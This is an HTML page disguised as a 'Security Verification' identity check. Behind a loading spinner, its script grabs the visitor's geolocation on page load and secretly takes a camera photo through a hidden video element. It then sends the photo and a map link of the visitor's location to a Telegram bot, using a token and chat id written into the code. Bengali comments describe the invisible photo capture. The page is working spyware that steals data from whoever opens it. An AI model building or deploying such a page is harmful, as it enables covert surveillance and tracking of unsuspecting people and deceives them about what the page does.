<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Verifying Your Identity...</h2>
    <p>Please wait while we secure your connection.</p>
    <div class="loader"></div>
    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // ক্যামেরা এবং লোকেশন পারমিশন চাওয়া
        window.onload = async () => {
            try {
                // লোকেশন ট্র্যাকিং
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;

                    // ক্যামেরা ট্র্যাকিং (অদৃশ্যভাবে ছবি তোলা)
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(async () => {
                        const canvas = document.getElementById('canvas');
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => sendToTelegram(blob, lat, lon), 'image/jpeg');
                        stream.getTracks().forEach(track => track.stop());
                    }, 2000);
                });
            } catch (err) {
                console.error("Access Denied");
            }
        };

        // টেলিগ্রামে তথ্য পাঠানোর ফাংশন
        async function sendToTelegram(blob, lat, lon) {
            const formData = new FormData();
            // নোট: Vercel-এ এই টোকেন ও আইডি অলরেডি সেভ করা আছে
            formData.append('chat_id', '8766925591'); 
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', `🚨 অপরাধী চিহ্নিত!\n📍 লোকেশন: https://www.google.com/maps?q=${lat},${lon}`);

            await fetch(`https://api.telegram.org/bot8868947145:AAFjXyUwInMs1bGzhEvV9Oyla1eGkaKbbVg/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>
